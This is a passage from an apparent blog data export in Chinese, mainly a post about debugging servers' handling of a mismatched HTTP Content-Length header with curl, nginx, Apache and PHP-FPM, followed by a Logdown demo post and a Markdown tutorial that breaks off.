GMT</span><br><span class=\"line\">&lt; Accept-Ranges: bytes</span><br><span class=\"line\">&lt; ETag: &quot;923231989cead41:0&quot;</span><br><span class=\"line\">&lt; Server: Microsoft-IIS/7.5</span><br><span class=\"line\">&lt; X-Powered-By: ASP.NET</span><br><span class=\"line\">&lt; Date: Fri, 05 Apr 2019 16:23:21 GMT</span><br><span class=\"line\">&lt; Content-Length: 48739</span><br><span class=\"line\">&lt;</span><br></pre></td></tr></table></figure>\n<p>公司執行指令結果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$  curl -v --request &quot;GET&quot; --header &quot;content-length:200&quot; http://jimmypm.ehosting.com.tw/a.htm</span><br><span class=\"line\">Note: Unnecessary use of -X or --request, GET is already inferred.</span><br><span class=\"line\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class=\"line\">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class=\"line\">  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0*  Trying 203.69.42.72...</span><br><span class=\"line\">* TCP_NODELAY set</span><br><span class=\"line\">* Connected to jimmypm.ehosting.com.tw (203.69.42.72) port 80 (#0)</span><br><span class=\"line\">&gt; GET /a.htm HTTP/1.1</span><br><span class=\"line\">&gt; Host: jimmypm.ehosting.com.tw</span><br><span class=\"line\">&gt; User-Agent: curl/7.61.1</span><br><span class=\"line\">&gt; Accept: */*</span><br><span class=\"line\">&gt; content-length:200</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">  0     0    0     0    0     0      0      0 --:--:--  0:02:18 --:--:--     0*Empty reply from server</span><br><span class=\"line\"></span><br><span class=\"line\">* Connection #0 to host jimmypm.ehosting.com.tw left intact</span><br><span class=\"line\">curl: (52) Empty reply from server</span><br></pre></td></tr></table></figure>\n<h2 id=\"動態資源\"><a href=\"#動態資源\" class=\"headerlink\" title=\"動態資源\"></a>動態資源</h2><p>例如<code>*.asp</code>,<code>*.jsp</code>,<code>*.php</code><br>只要做到<code>Content-Length:2</code> 沒有送出<code>data</code>(POST DATA)<br>就會出錯，接收到<code>408</code> 連線逾時。</p>\n<p>這邊簡單詳細講一下，Server 是主動關閉的，這時候 client 會持續等待，使用者關閉頁面，也不會影響結果<br>使用者沒有關閉的話，Server 沒接收 data 資料，就會回傳<code>408</code><br>這時候使用者會接收到<code>408</code></p>\n<p>維基百科</p>\n<blockquote>\n<p>408 Request Timeout<br>請求超時。根據 HTTP 規範，用戶端沒有在伺服器預備等待的時間內完成一個請求的傳送，用戶端可以隨時再次提交這一請求而無需進行任何更改</p>\n</blockquote>\n<h2 id=\"HTTPS\"><a href=\"#HTTPS\" class=\"headerlink\" title=\"HTTPS\"></a>HTTPS</h2><p>不管靜態資源、動態資源都會錯誤</p>\n<ul>\n<li>動態資源</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -v --request <span class=\"string\">\"GET\"</span> --header <span class=\"string\">\"Content-Length:3\"</span> --data <span class=\"string\">\"12345\"</span>  https://tw.yahoo.com                                                                                       ✔  20  15:16:43</span><br><span class=\"line\">* Rebuilt URL to: https://tw.yahoo.com/</span><br><span class=\"line\">*   Trying 124.108.103.104...</span><br><span class=\"line\">* TCP_NODELAY <span class=\"built_in\">set</span></span><br><span class=\"line\">* Connected to tw.yahoo.com (124.108.103.104) port 443 (<span class=\"comment\">#0)</span></span><br><span class=\"line\">* ALPN, offering h2</span><br><span class=\"line\">* ALPN, offering http/1.1</span><br><span class=\"line\">* successfully <span class=\"built_in\">set</span> certificate verify locations:</span><br><span class=\"line\">*   CAfile: /etc/ssl/certs/ca-certificates.crt</span><br><span class=\"line\">  CApath: /etc/ssl/certs</span><br><span class=\"line\">* TLSv1.2 (OUT), TLS handshake, Client hello (1):</span><br><span class=\"line\">* TLSv1.2 (IN), TLS handshake, Server hello (2):</span><br><span class=\"line\">* TLSv1.2 (IN), TLS handshake, Certificate (11):</span><br><span class=\"line\">* TLSv1.2 (IN), TLS handshake, Server key exchange (12):</span><br><span class=\"line\">* TLSv1.2 (IN), TLS handshake, Server finished (14):</span><br><span class=\"line\">* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):</span><br><span class=\"line\">* TLSv1.2 (OUT), TLS change cipher, Client hello (1):</span><br><span class=\"line\">* TLSv1.2 (OUT), TLS handshake, Finished (20):</span><br><span class=\"line\">* TLSv1.2 (IN), TLS handshake, Finished (20):</span><br><span class=\"line\">* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256</span><br><span class=\"line\">* ALPN, server accepted to use h2</span><br><span class=\"line\">* Server certificate:</span><br><span class=\"line\">*  subject: C=US; ST=California; L=Sunnyvale; O=Oath Inc; CN=*.www.yahoo.com</span><br><span class=\"line\">*  start date: Feb  1 00:00:00 2019 GMT</span><br><span class=\"line\">*  expire date: Jul 31 12:00:00 2019 GMT</span><br><span class=\"line\">*  subjectAltName: host <span class=\"string\">\"tw.yahoo.com\"</span> matched cert<span class=\"string\">'s \"tw.yahoo.com\"</span></span><br><span class=\"line\"><span class=\"string\">*  issuer: C=US; O=DigiCert Inc; OU=www.digicert.com; CN=DigiCert SHA2 High Assurance Server CA</span></span><br><span class=\"line\"><span class=\"string\">*  SSL certificate verify ok.</span></span><br><span class=\"line\"><span class=\"string\">* Using HTTP2, server supports multi-use</span></span><br><span class=\"line\"><span class=\"string\">* Connection state changed (HTTP/2 confirmed)</span></span><br><span class=\"line\"><span class=\"string\">* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0</span></span><br><span class=\"line\"><span class=\"string\">* Using Stream ID: 1 (easy handle 0x55d96331c780)</span></span><br><span class=\"line\"><span class=\"string\">&gt; GET / HTTP/2</span></span><br><span class=\"line\"><span class=\"string\">&gt; Host: tw.yahoo.com</span></span><br><span class=\"line\"><span class=\"string\">&gt; User-Agent: curl/7.58.0</span></span><br><span class=\"line\"><span class=\"string\">&gt; Accept: */*</span></span><br><span class=\"line\"><span class=\"string\">&gt; Content-Length:3</span></span><br><span class=\"line\"><span class=\"string\">&gt; Content-Type: application/x-www-form-urlencoded</span></span><br><span class=\"line\"><span class=\"string\">&gt;</span></span><br><span class=\"line\"><span class=\"string\">* We are completely uploaded and fine</span></span><br><span class=\"line\"><span class=\"string\">* Connection state changed (MAX_CONCURRENT_STREAMS updated)!</span></span><br><span class=\"line\"><span class=\"string\">* Connection #0 to host tw.yahoo.com left intact</span></span><br><span class=\"line\"><span class=\"string\">curl: (16) Error in the HTTP2 framing layer</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>靜態資源</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"> curl  --request <span class=\"string\">\"GET\"</span> --header <span class=\"string\">\"Content-Length:3\"</span>  https://code.jquery.com/jquery-1.11.3.js</span><br><span class=\"line\">curl: (52) Empty reply from server</span><br></pre></td></tr></table></figure>\n<h2 id=\"Content-Length-接收的值-gt-Header-值\"><a href=\"#Content-Length-接收的值-gt-Header-值\" class=\"headerlink\" title=\"Content-Length 接收的值&gt;Header 值\"></a>Content-Length 接收的值&gt;Header 值</h2><p>我有簡單寫個 PHP 程式</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$data = file_get_contents(<span class=\"string\">'php://input'</span>);</span><br><span class=\"line\">var_dump($data);</span><br></pre></td></tr></table></figure>\n<p>簡單可以看出 post raw data<br>這邊用 nginx+phpfpm 測出來結果<br>其實會被截斷</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -v --request <span class=\"string\">\"GET\"</span> --header <span class=\"string\">\"Content-Length:3\"</span> --data <span class=\"string\">\"12345\"</span>  http://192.168.1.121:32771/testpost.php</span><br><span class=\"line\">*   Trying 192.168.1.121...</span><br><span class=\"line\">* TCP_NODELAY <span class=\"built_in\">set</span></span><br><span class=\"line\">* Connected to 192.168.1.121 (192.168.1.121) port 32771 (<span class=\"comment\">#0)</span></span><br><span class=\"line\">&gt; GET /testpost.php HTTP/1.1</span><br><span class=\"line\">&gt; Host: 192.168.1.121:32771</span><br><span class=\"line\">&gt; User-Agent: curl/7.58.0</span><br><span class=\"line\">&gt; Accept: */*</span><br><span class=\"line\">&gt; Content-Length:3</span><br><span class=\"line\">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">* upload completely sent off: 5 out of 5 bytes</span><br><span class=\"line\">&lt; HTTP/1.1 200 OK</span><br><span class=\"line\">&lt; Date: Sat, 06 Apr 2019 07:14:21 GMT</span><br><span class=\"line\">&lt; Server: Apache/2.4.25 (Debian)</span><br><span class=\"line\">&lt; Content-Length: 16</span><br><span class=\"line\">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class=\"line\">&lt;</span><br><span class=\"line\">string(3) <span class=\"string\">\"123\"</span></span><br><span class=\"line\">* Connection <span class=\"comment\">#0 to host 192.168.1.121 left intact</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Apache-Cotent-Length-不會-408\"><a href=\"#Apache-Cotent-Length-不會-408\" class=\"headerlink\" title=\"Apache Cotent-Length 不會 408\"></a>Apache Cotent-Length 不會 408</h2><p>今天發現有一個 PHP 網站，<code>content-length:x</code>都可以正常運作<br>不過發現是用<code>apache+mod_php</code><br>我自己有測試還真的能 work</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl --request <span class=\"string\">\"GET\"</span> --header <span class=\"string\">\"Content-Length:3\"</span> http://mcu.no-ip.org/</span><br></pre></td></tr></table></figure>\n<p>可用這個 docker hub 做簡單測試<br><a href=\"https://hub.docker.com/r/eboraas/apache-php/dockerfile\" target=\"_blank\" rel=\"noopener\">eboraas/apache-php Dockerfile - Docker Hub</a></p>\n<p>PS:apache+php-fpm 不會回傳 response，但說奇怪 apache log 會顯示 200</p>\n<p>以下是 apache+php-fpm</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -v --request <span class=\"string\">\"GET\"</span> --header <span class=\"string\">\"Content-Length:3\"</span>  http://192.168.1.121:32772/testpost.php</span><br><span class=\"line\"></span><br><span class=\"line\">Note: Unnecessary use of -X or --request, GET is already inferred.</span><br><span class=\"line\">*   Trying 192.168.1.121...</span><br><span class=\"line\">* TCP_NODELAY <span class=\"built_in\">set</span></span><br><span class=\"line\">* Connected to 192.168.1.121 (192.168.1.121) port 32772 (<span class=\"comment\">#0)</span></span><br><span class=\"line\">&gt; GET /phpinfo.php HTTP/1.1</span><br><span class=\"line\">&gt; Host: 192.168.1.121:32772</span><br><span class=\"line\">&gt; User-Agent: curl/7.58.0</span><br><span class=\"line\">&gt; Accept: */*</span><br><span class=\"line\">&gt; Content-Length:3</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&lt; HTTP/1.1 200 OK</span><br><span class=\"line\">&lt; Date: Sat, 06 Apr 2019 07:08:31 GMT</span><br><span class=\"line\">&lt; Server: Apache/2.4.7 (Ubuntu)</span><br><span class=\"line\">&lt; Connection: close</span><br><span class=\"line\">&lt;</span><br><span class=\"line\">* Closing connection 0</span><br></pre></td></tr></table></figure>\n<p>什麼 Apache 跟 nginx 結果不太一樣!!!<br>我也冏了!!!不過依然沒有找到相關文獻</p>\n<p>在 Apache 官網文件<a href=\"https://httpd.apache.org/docs/trunk/en/mod/mod_policy.html\" target=\"_blank\" rel=\"noopener\">mod_policy - Apache HTTP Server Version 2.5</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PolicyLength Directive</span><br><span class=\"line\">Description:\tEnable the content length policy.</span><br><span class=\"line\">Syntax:\tPolicyLength ignore|log|enforce</span><br><span class=\"line\">Default:\tignore</span><br><span class=\"line\">Context:\tserver config, virtual host, directory</span><br><span class=\"line\">Status:\tExtension</span><br><span class=\"line\">Module:\tmod_policy</span><br><span class=\"line\">Compatibility:\tPolicyLength is only available in Apache 2.5.0 and later.</span><br></pre></td></tr></table></figure>\n<p>不確定是不是這個關係，目前他說這個選項 Apache2.5 才會有(現在才 Apache2.4)<br>我找不到 2.5 版本= =<br>有可能現在是讓他過</p>\n<h2 id=\"Web-Application-Firewall-影響\"><a href=\"#Web-Application-Firewall-影響\" class=\"headerlink\" title=\"Web Application Firewall 影響\"></a>Web Application Firewall 影響</h2><p>有爬到這個，目前猜測公司或有些網站連不到可能之中有類似 WAF<br>這東西影響到<br><a href=\"https://www.qa-knowhow.com/?p=4679\" target=\"_blank\" rel=\"noopener\">Web Application Firewall 的偵測原理 – 軟體品管的專業思維</a></p>\n<blockquote>\n<ol start=\"6\">\n<li>HTTP 標準協議<br>檢查請求的內容是否符合 HTTP 標準協議, 這是一種比較有效且直覺的方式<br>任意修改 HTTP 協議內容可能會導致的攻擊如下:<br><a href=\"http://capec.mitre.org/data/definitions/220.html\" target=\"_blank\" rel=\"noopener\">http://capec.mitre.org/data/definitions/220.html</a><br>HTTP 協議中檢查的重點為:<br>MIME 中 filename 檔名<br>URL 合法性<br>Content-Length 數值<br>衝突與重複的 HTTP headers, 例如 keep-alive 與 close 重複與衝突<br>不安全的字元, 例如 ” “, “&lt;“, “&gt;”, “{“, “}”, “|”, “\\”, “^”, “~”, “[“, “]”, and “`”.等<br>過濾異常缺少 Http header 的請求, 一般正常的請求會包含 Host, User-Agent, Accept headers, 因此如果缺少或是沒有值都是表示異常<br>Content-Length 不等於 0 但是卻沒有 Content-Type<br>HTTP protocol version</li>\n</ol>\n</blockquote>\n<h2 id=\"nginx-從-phpfpm-那邊調整-改-header-失敗筆記\"><a href=\"#nginx-從-phpfpm-那邊調整-改-header-失敗筆記\" class=\"headerlink\" title=\"nginx 從 phpfpm 那邊調整 改 header 失敗筆記\"></a>nginx 從 phpfpm 那邊調整 改 header 失敗筆記</h2><p>在這裡面<a href=\"https://www.jianshu.com/p/282db1543a78\" target=\"_blank\" rel=\"noopener\">Nginx 之 fastcgi_param 参数详见 - 简书</a><br><code>fastcgi_param CONTENT_LENGTH $content_length; #请求头中的Content-length字段。</code><br>發現這個不會正常執行<br>目前猜測 nginx 在接收 request 封包時候，第一時間不會做更改<br>但當時<code>Content-Length:2</code>會持續等待<br>所以可能在等接收資料，逾時會傳 408<br>所以根本<del>不會做到修改 header 那一段</del>正確來說 php-fpm 那段沒有執行到<br>收不到改 header 那段</p>\n<h2 id=\"nginx-POST-打靜態資源會-405\"><a href=\"#nginx-POST-打靜態資源會-405\" class=\"headerlink\" title=\"nginx POST 打靜態資源會 405\"></a>nginx POST 打靜態資源會 405</h2><p><a href=\"https://gist.github.com/zxhfighter/7560812\" target=\"_blank\" rel=\"noopener\">Nginx 將靜態文件響應 POST 請求，提示 405 錯誤問題</a></p>\n<blockquote>\n<p>Nginx 的 405 錯誤<br>絕大多數服務器，都不允許靜態文件響應 POST 請求(GET 請求靜態文件是天經地義的)，否則會返回 HTTP/1.1 405 Method not allowed 錯誤。<br>然而在前端開發中，前端開發工程師經常模擬後端請求，返回靜態數據來查看頁面效果，怎麼辦？</p>\n</blockquote>\n<h2 id=\"其他小記\"><a href=\"#其他小記\" class=\"headerlink\" title=\"其他小記\"></a>其他小記</h2><p>curl 預設是 Content-Type: application/x-www-form-urlencoded ，假如要傳 raw data 要改成 Content-Type: text/plain</p>\n<blockquote>\n<p>curl’s –data will by default send Content-Type: application/x-www-form-urlencoded in the request header. However, when using Postman’s raw body mode, Postman sends Content-Type: text/plain in the request header.<br>So to achieve the same thing as Postman, specify -H “Content-Type: text/plain” for curl:</p>\n</blockquote>\n<p>重啟 docker nginx<br><a href=\"https://www.shellhacks.com/docker-reload-nginx-inside-container/\" target=\"_blank\" rel=\"noopener\">Docker: Reload Nginx Inside Container - ShellHacks</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker container <span class=\"built_in\">exec</span> &lt;container&gt; nginx -t</span><br><span class=\"line\">docker container <span class=\"built_in\">exec</span> &lt;container&gt; nginx -s reload</span><br></pre></td></tr></table></figure>\n<p>Keep-Alive 为 close<br>也無法改變 nginx 的 content-length 問題<br>keepalive_timeout 0; ，就可以關掉</p>\n<p>Full request/response body logging in nginx 沒有測試，好像要裝 lua-nginx-module<br><a href=\"https://gist.github.com/morhekil/1ff0e902ed4de2adcb7a\" target=\"_blank\" rel=\"noopener\">Full request/response body logging in nginx</a></p>\n<h2 id=\"感想與結論\"><a href=\"#感想與結論\" class=\"headerlink\" title=\"感想與結論\"></a>感想與結論</h2><p>沒事<strong>還是請傳好正確 content-length:0</strong><br>原本想讓 server 變成 http1.0<br>但好像怎麼用都失敗</p>\n<p>對方說沒辦法改的話<br>最終大絕可能使用<code>apache+php_mod</code>不過最糟的情形還是會被 WAF 阻擋</p>\n<p>這幾天總覺得浪費很多時間找這玩意<br>明明是對方的鍋，還是要想辦法解決<br>但是真的不希望遇到第二次 冏</p>\n<p><strong>2020-05-27</strong></p>\n<p><a href=\"https://blog.fundebug.com/2019/09/10/understand-http-content-length/\" target=\"_blank\" rel=\"noopener\">用了这么久HTTP, 你是否了解Content-Length? | Fundebug博客 - 一行代码搞定BUG监控 - 网站错误监控|JS错误监控|资源加载错误|网络请求错误|小程序错误监控|Java异常监控|监控报警|Source Map|用户行为|可视化重现</a><br>這篇有簡單明確講到我這篇重點</p>\n<p>其他參考來源:</p>\n<ul>\n<li><a href=\"https://nkongkimo.wordpress.com/2010/04/28/http-header%E5%85%A5%E9%96%80/\" target=\"_blank\" rel=\"noopener\">Http Header 入門 | CCNP 筆記本</a></li>\n<li><a href=\"https://www.qa-knowhow.com/?p=792\" target=\"_blank\" rel=\"noopener\">HTTP Request/Response 駭客跟我們想的不一樣 – 軟體品管的專業思維</a></li>\n<li><a href=\"https://ssorc.tw/1148\" target=\"_blank\" rel=\"noopener\">security apache 與 php 關閉版本顯示 | SSORC.tw</a></li>\n<li><a href=\"http://chuehnoneinfonote.blogspot.com/2013/02/apache-http-header.html\" target=\"_blank\" rel=\"noopener\">資訊手札: Apache Http Header</a></li>\n<li><a href=\"http://blog.gitdns.org/2016/06/23/web-server/\" target=\"_blank\" rel=\"noopener\">web-server | 平凡備忘錄</a></li>\n<li><a href=\"https://www.byvoid.com/zht/blog/http-keep-alive-header\" target=\"_blank\" rel=\"noopener\">HTTP 協議頭部與 Keep-Alive 模式詳解 - BYVoid</a></li>\n<li><a href=\"https://lvtao.net/server/1458.html\" target=\"_blank\" rel=\"noopener\">nginx 优化的一些建议 - 吕滔博客</a></li>\n<li><p><a href=\"https://www.zhihu.com/question/36007098\" target=\"_blank\" rel=\"noopener\">客户端 POST 错误，服务端应该回 200 还是 400？ - 知乎</a></p>\n</li>\n<li><p><a href=\"https://www.jianshu.com/p/fa2e4e23aaaf\" target=\"_blank\" rel=\"noopener\">Http 協議中關於 Content-Length 的解讀 - 簡書</a></p>\n</li>\n<li><a href=\"https://www.shellhacks.com/docker-reload-nginx-inside-container/\" target=\"_blank\" rel=\"noopener\">Docker: Reload Nginx Inside Container - ShellHacks</a></li>\n<li><a href=\"https://www.cnblogs.com/meteoric_cry/archive/2011/06/07/2074150.html\" target=\"_blank\" rel=\"noopener\">Nginx 设置 Keep-Alive 为 close - meteoric_cry - 博客园</a></li>\n<li><a href=\"https://gist.github.com/zxhfighter/7560812\" target=\"_blank\" rel=\"noopener\">Nginx 將靜態文件響應 POST 請求，提示 405 錯誤問題</a></li>\n<li><a href=\"https://www.qiansw.com/nginx-responds-to-the-post-request-in-the-static-file-and-prompts-405-for-the-error-problem.html\" target=\"_blank\" rel=\"noopener\">Nginx 将静态文件响应 POST 请求，提示 405 错误问题 - 千思网</a></li>\n<li><a href=\"https://gist.github.com/morhekil/1ff0e902ed4de2adcb7a\" target=\"_blank\" rel=\"noopener\">Full request/response body logging in nginx</a></li>\n<li><a href=\"https://blog.csdn.net/qq_25551295/article/details/51744815\" target=\"_blank\" rel=\"noopener\">Nginx 安装 lua-nginx-module 模块 - 拼搏的小船长 - CSDN 博客</a></li>\n<li><a href=\"https://notfalse.net/42/http-payload\" target=\"_blank\" rel=\"noopener\">未連線: 潛在的安全性問題</a></li>\n<li><a href=\"https://www.qa-knowhow.com/?p=4679\" target=\"_blank\" rel=\"noopener\">Web Application Firewall 的偵測原理 – 軟體品管的專業思維</a></li>\n<li><a href=\"https://www.oschina.net/question/2547791_2150761\" target=\"_blank\" rel=\"noopener\">nginx 的 chunked_transfer_encoding 没有生效 - 开源中国</a></li>\n<li><a href=\"https://geekflare.com/open-source-web-application-firewall/#1-ModSecurity\" target=\"_blank\" rel=\"noopener\">5 Open Source Web Application Firewall for Better Security</a></li>\n<li><a href=\"http://cyrilwang.blogspot.com/2014/01/apache-modsecurity.html\" target=\"_blank\" rel=\"noopener\">不只是資安: [工具介紹] Apache 模組 mod_security - 以阻擋造訪路徑攻擊為例</a></li>\n<li><a href=\"https://www.jianshu.com/p/282db1543a78\" target=\"_blank\" rel=\"noopener\">Nginx 之 fastcgi_param 参数详见 - 简书</a></li>\n<li><a href=\"http://blog.kent-chiu.com/2013/08/14/testing-rest-with-curl-command.html\" target=\"_blank\" rel=\"noopener\">使用 curl 指令測試 REST 服務</a></li>\n<li><a href=\"https://stackoverflow.com/questions/43054195/how-to-post-raw-body-data-with-curl\" target=\"_blank\" rel=\"noopener\">linux - How to post raw body data with curl? - Stack Overflow</a></li>\n<li><a href=\"https://github.com/rlerdorf/php7dev/issues/48\" target=\"_blank\" rel=\"noopener\">Where is php-fpm log file? Or how to activate it? Does PHP7 log errors? · Issue #48 · rlerdorf/php7dev</a></li>\n<li><a href=\"https://blog.gtwang.org/linux/nginx-enable-php-fpm-status-page-tutorial/\" target=\"_blank\" rel=\"noopener\">Nginx 啟用 PHP-FPM 服務狀態監控網頁教學 - G. T. Wang</a></li>\n<li><a href=\"https://stackoverflow.com/questions/35190034/where-is-the-default-zsh-history-file\" target=\"_blank\" rel=\"noopener\">Where is the default zsh history file? - Stack Overflow</a></li>\n</ul>\n","categories":["寫程式一些事"],"tags":["nginx","apache"]},{"title":"Hello World","url":"/blog/2014/05/27/logdown/2014-05-27-hello-world/","content":"<p>Hi, This a demo post of <a href=\"http://logdown.com\" target=\"_blank\" rel=\"noopener\">Logdown</a>. </p>\n<p>Logdown use Markdown as main syntax, you can find more example by reading this <a href=\"http://en.wikipedia.org/wiki/Markdown\" target=\"_blank\" rel=\"noopener\">document on Wikipedia</a></p>\n<p>Logdown also support drag &amp; drop image uploading. The picture syntax is like this:</p>\n<p><img src=\"http://logdown.com/images/logo.png\" alt=\"\"></p>\n<h2 id=\"Bloging-with-code-snippet\"><a href=\"#Bloging-with-code-snippet\" class=\"headerlink\" title=\"Bloging with code snippet:\"></a>Bloging with code snippet:</h2><p><code>inline code</code></p>\n<h3 id=\"Plain-Code\"><a href=\"#Plain-Code\" class=\"headerlink\" title=\"Plain Code\"></a>Plain Code</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">puts &quot;Hello World!&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Code-with-Language\"><a href=\"#Code-with-Language\" class=\"headerlink\" title=\"Code with Language\"></a>Code with Language</h3><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\">puts <span class=\"string\">\"Hello World!\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Code-with-Title\"><a href=\"#Code-with-Title\" class=\"headerlink\" title=\"Code with Title\"></a>Code with Title</h3><figure class=\"highlight ruby\"><figcaption><span>hello_world.rb</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">puts <span class=\"string\">\"Hello World!\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"MathJax-Example\"><a href=\"#MathJax-Example\" class=\"headerlink\" title=\"MathJax Example\"></a>MathJax Example</h2><h3 id=\"Mathjax\"><a href=\"#Mathjax\" class=\"headerlink\" title=\"Mathjax\"></a>Mathjax</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">x = \\dfrac&#123;-b \\pm \\sqrt&#123;b^2 - 4ac&#125;&#125;&#123;2a&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Inline-Mathjax\"><a href=\"#Inline-Mathjax\" class=\"headerlink\" title=\"Inline Mathjax\"></a>Inline Mathjax</h3><p>The answser is <code>$a^2 + b^2 = c^2$</code>.</p>\n<h2 id=\"Table-Example\"><a href=\"#Table-Example\" class=\"headerlink\" title=\"Table Example\"></a>Table Example</h2><table>\n<thead>\n<tr>\n<th>Tables</th>\n<th style=\"text-align:center\">Are</th>\n<th style=\"text-align:right\">Cool</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>col 1</td>\n<td style=\"text-align:center\">Hello</td>\n<td style=\"text-align:right\">$1600</td>\n</tr>\n<tr>\n<td>col 2</td>\n<td style=\"text-align:center\">Hello</td>\n<td style=\"text-align:right\">$12</td>\n</tr>\n<tr>\n<td>col 3</td>\n<td style=\"text-align:center\">Hello</td>\n<td style=\"text-align:right\">$1</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"Markdown新手小試","url":"/blog/2014/06/05/logdown/2014-06-05-markdown-rookie-scale/","content":"<p>在前幾年有Markdown這個東西，有嘗試著練習。不過…太久沒用了，也沒有實戰用到…，所以全部忘光光囧，但最近看到LogDown這個玩意，就突然想寫寫看。<br>LogDown是台灣xdite大大做的，也算是台灣之光，所以也來支持一下^^<br><a id=\"more\"></a></p>\n<p>#標題寫法<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">標題寫法(最高階)</span><br><span class=\"line\">===</span><br></pre></td></tr></table></figure></p>\n<p>or<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">標題寫法(第二階)</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure></p>\n<p>or<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#標題寫法</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>引用</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;引用</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>引用</p>\n<blockquote>\n<p>區塊引用</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;引用</span><br><span class=\"line\">&gt;&gt;區塊引用</span><br></pre></td></tr></table></figure>\n<ul>\n<li>清單<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">+ 清單</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>or<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">- 清單</span><br></pre></td></tr></table></figure></p>\n<p>or<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">* 清單</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li>PHP</li>\n<li>Python</li>\n<li>Ruby on Rails</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. PHP</span><br><span class=\"line\">2. Python</span><br><span class=\"line\">3. Ruby on Rails</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>This is a list item with two paragraphs.</p>\n<p>This is the second paragraph in the list item. You’re<br>only required to indent the first line. Lorem ipsum dolor<br>sit amet, consectetuer adipiscing elit.</p>\n</li>\n<li><p>Another item in the same list.</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">*   This is a list item with two paragraphs.</span><br><span class=\"line\"></span><br><span class=\"line\">    This is the second paragraph in the list item. You&apos;re (前面空白可縮白)</span><br><span class=\"line\">only required to indent the first line. Lorem ipsum dolor</span><br><span class=\"line\">sit amet, consectetuer adipiscing elit.</span><br><span class=\"line\"></span><br><span class=\"line\">*   Another item in the same list.</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>test</p>\n<blockquote>\n<p>test</p>\n</blockquote>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">* test</span><br><span class=\"line\"></span><br><span class=\"line\">    &gt;test(前面四個空白)</span><br></pre></td></tr></table></figure>\n<p>1986.  What a great season.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1986\\. What a great season.</span><br></pre></td></tr></table></figure>\n<p>This is a <a href=\"http://google.com.tw\" target=\"_blank\" rel=\"noopener\">Google Url </a>.<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">This is a [Google Url ](http://google.com.tw).</span><br></pre></td></tr></table></figure></p>\n<p>This is a 相對位置 <a href=\"test\">url</a>.<br>This is a  絕對位置 <a href=\"/test/\">url</a>.<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">This is a 相對位置 [url](test).</span><br><span class=\"line\">This is a  絕對位置 [url](/test/).</span><br></pre></td></tr></table></figure></p>\n<p>This is a [Google URL][Google].<br>This is a [谷歌][谷歌].(id:中文也可以)<br>[Google]: <a href=\"http://google.com.tw\" target=\"_blank\" rel=\"noopener\">http://google.com.tw</a>  “Google”<br>[谷歌]: <a href=\"http://google.com.tw\" target=\"_blank\" rel=\"noopener\">http://google.com.tw</a>  “谷歌”</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">This is a \\[Google URL\\]\\[Google\\].</span><br><span class=\"line\">This is a \\[Google URL\\]\\[google]\\.</span><br><span class=\"line\">This is a 